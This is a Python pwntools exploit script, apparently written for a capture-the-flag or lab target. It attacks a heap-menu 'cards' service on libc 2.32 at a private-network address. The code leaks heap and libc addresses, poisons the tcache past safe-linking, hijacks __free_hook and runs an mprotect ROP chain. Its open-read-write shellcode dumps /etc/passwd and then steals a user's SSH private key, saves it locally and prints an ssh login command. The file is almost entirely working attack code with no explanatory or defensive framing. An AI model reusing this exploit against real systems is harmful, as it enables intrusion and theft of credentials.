from pwn import *

import re
import time
import os
import stat
import subprocess

context(os='linux',arch='amd64')

#target = ELF('./cards')
libc   = ELF('./libc-2.32.so', checksec=False)

r = None

main_arena_p336_off = 0x1c4cf0

GET_PASSWD = 0x1
GET_IDRSA  = 0x2

TARGET_HOST = '192.168.15.10'
TARGET_PORT = 1337

#print ('ssh {0}@{1} -i remote_key'.format('julio', TARGET_HOST))

def add(size, content=""):
    r.sendlineafter('Choice: ', '1')
    r.sendafter('card: ', str(int(size)))
    r.sendafter('color: ', 'blue')
    r.sendafter('name: ', content)

def remove(index):
    r.sendlineafter('Choice: ', '2')
    r.sendafter('card: ', str(index))

def edit(index, content):
    r.sendlineafter('Choice: ', '3')
    r.sendafter('card: ', str(index))
    r.sendafter('name: ', content)

def show(index):
    r.sendlineafter('Choice: ', '4')
    r.sendafter('card: ', str(index))

def trigger_rop(rop):
    r.sendlineafter('Choice: ', '6')
    r.sendafter('name: ', rop)

def PROTECT_PTR(base, addr):
    return (base >> 12) ^ addr

def find_tty_users(passwd, last=False):
    users = []
    passwd = passwd.split('\n')
    for line in passwd:
        if '/bin/bash' not in line: continue
        else: users.append(line)
    
    if last: return users[-1]
    return users

def exploit(action, user=""):
    global r
    r = remote(TARGET_HOST, TARGET_PORT)

    add(0x28, 'A'*0x28) # 0 
    remove(0)

    add(0x28, 'A'*(16-2) + 'B'*2) # 1
    show(1); r.recvuntil('BB')

    leak = u64(r.recvn(6).ljust(8, '\x00'))
    log.success('Heap leak: ' + hex(leak))

    heap_base  = int(hex(leak)[:11] + '0'*3, 16)
    log.success('Heap base: ' + hex(heap_base))

    #gdb.attach(r, gdbscript='''c
    #x/200gx {0}'''.format(hex(heap_base)))

    add(0xd8, 'C'*24) # 2
    add(0xd8, 'D'*24) # 3

    remove(2)
    remove(3)
    '''
    4x 0x30
    2x 0xd8
    '''

    # Poison tcach->fd with encoded pointer
    edit(3, p64(PROTECT_PTR(heap_base, heap_base+0x10)))

    if action == GET_PASSWD:
        add(0xd8, "/etc/passwd\x00") # 4
    elif action == GET_IDRSA:
        add(0xd8, "{0}\x00".format(user)) # 4
    else:
        log.error(str(action) + ' NOT A VALID ACTION')
        exit(1)


    file_name_addr = heap_base+0x4d0
    '''
    2x 0x30
    1x 0xd8
    '''

    # This goes to unsorted
    add(0xf1, 'E'*8) # 5
    '''
    0x 0x30
    1x 0xd8
    '''

    # Allocated on top of the heap
    log.info('Alocatting on top of the heap')
    add(0xd8, p64(0x0)*3 + p64(0x0000000700000000)) # 6
    '''
    0x 0x30
    0x 0xd8
    '''

    # Putting chunk 5 inside unsorted chunk
    remove(5)
    '''
    2x 0x30
    0x 0x100 - Unsorted
    '''

    # Zeroing 0x100 tcache count
    edit(6, p64(0x0000000000020000) + p64(0x0)*3)

    # Allocate on unsorted chunk
    add(0x90, "A"*6 + 'CC') # 7

    # Leaking <main_arena+336>
    show(7); r.recvuntil('CC')

    main_arena_p336 = u64(r.recvn(6).ljust(8, '\x00'))
    log.success('Leaked <main_arena+336>: ' + hex(main_arena_p336))

    libc_base = main_arena_p336-main_arena_p336_off
    log.success('Libc base addr: ' + hex(libc_base))

    free_hook = libc_base+libc.symbols['__free_hook']
    log.success('__free_hook addr: ' + hex(free_hook))

    #libc_environ = libc_base + libc.symbols['environ']
    #log.success('Libc environ: ' + hex(libc_environ))
    #edit(6, p64(0x0000000000000001) + p64(0x0)*15 + p64(libc_environ))

    # Gadgets
    #add_rsp = 0x000000000004b2f7 # 0x000000000004b2f7: add rsp, 0xd8; ret;
    add_rsp = 0x0000000000053145 # 0x0000000000053145: add rsp, 0x38; ret;
    pop_rdi = 0x0000000000027b36 # 0x0000000000027b36: pop rdi; ret;
    pop_rsi = 0x0000000000032bba # 0x0000000000032bba: pop rsi; ret;
    #pop_rdx_pop_r12 = 0x00000000000fc961 # 0x00000000000fc961: pop rdx; pop r12; ret;
    pop_rdx = 0x00000000001730c2 # 0x00000000001730c2: pop rdx; add eax, 0x5b050f00; ret;

    #gdb.attach(r, gdbscript='''b *{0}
    #c'''.format(heap_base+0x5b0))

    #gdb.attach(r, gdbscript='''b *{0}
    #c'''.format(heap_base+0x5b0))

    # Add __free_hook addr to tcache entry (size: 0x20)
    log.info('Poisoning __free_hook with stack address...')
    edit(6, p64(0x0000000000000001) + p64(0x0)*15 + p64(free_hook))
    add(0x18, p64(libc_base+add_rsp)) # 8

    log.info('Starting mprotect ('+hex(heap_base)+') rop chain...')
    mprotect  = p64(libc_base+pop_rdi)
    mprotect += p64(heap_base)
    mprotect += p64(libc_base+pop_rsi)
    mprotect += p64(0x1000)
    mprotect += p64(libc_base+pop_rdx)
    mprotect += p64(0x7)
    mprotect += p64(libc_base+0x00000000000fc0f0)
    mprotect += p64(heap_base+0x5b0)

    '''
    %rdi	%rsi	%rdx
    const char __user * filename	int flags	umode_t mode

    %rdi	%rsi	%rdx
    unsigned int fd	char __user * buf	size_t count

    %rdi	%rsi	%rdx
    unsigned int fd	const char __user * buf	size_t count
    '''

    log.info('Crafting ORW shellcode...')
    print ('''
    %rdi	%rsi	%rdx
    const char __user * filename	int flags	umode_t mode

    %rdi	%rsi	%rdx
    unsigned int fd	char __user * buf	size_t count

    %rdi	%rsi	%rdx
    unsigned int fd	const char __user * buf	size_t count
    ''')

    if action == GET_IDRSA:
        shellcode = asm("""
            xor rax, rax
            mov rax, 0x2
            xor rsi, rsi
            xor rdx, rdx
            mov rdi, {0}
            syscall
            mov r10, rax
            xor rax, rax
            mov rdi, r10
            mov rsi, {1}
            mov rdx, 0xa8c
            syscall
            mov rax, 0x1
            mov rdi, 0x1
            syscall
            mov rax, 0x3c
            mov rdi, 0x1337
            syscall
        """.format(heap_base+0x4d0, heap_base+0x710))
    elif action == GET_PASSWD:
        shellcode = asm("""
            xor rax, rax
            mov rax, 0x2
            xor rsi, rsi
            xor rdx, rdx
            mov rdi, {0}
            syscall
            mov r10, rax
            xor rax, rax
            mov rdi, r10
            mov rsi, {1}
            mov rdx, 0xfa0
            syscall
            mov rax, 0x1
            mov rdi, 0x1
            syscall
            mov rax, 0x3c
            mov rdi, 0x1337
            syscall
        """.format(heap_base+0x4d0, heap_base+0x710))
    else:
        log.error(str(action) + ' NOT A VALID ACTION')
        exit(1)


    edit(7, shellcode)

    trigger_rop(mprotect)

    remove(4)

    if action == GET_PASSWD:
        log.info('Reading /etc/passwd')
    else:
        log.info('Reading ' + user)

    data = r.recv()
    
    r.close()

    return data

log.info('Starting exploit')
passwd_content = exploit(GET_PASSWD)

log.info('Got passwd... Geting user id_rsa path...')
user = find_tty_users(passwd_content, last=True)
user_name = user.split(':')[0]
ssh_key_path = user.split(':')[-2] + '/.ssh/id_rsa'

log.success('id_rsa found: ' + ssh_key_path)

log.info('Getting id_rsa file from remote...')
time.sleep(2)
id_rsa = exploit(GET_IDRSA, user=ssh_key_path)

ssh_key = open('./remote_key', 'w')
ssh_key.write(id_rsa.split('\x00')[0])

log.info('Writting id_rsa file to local...')
os.chmod('./remote_key', stat.S_IRUSR | stat.S_IWUSR)

print('*** PWNED ***')

print('run:\nssh {0}@{1} -i remote_key'.format(user_name, TARGET_HOST))
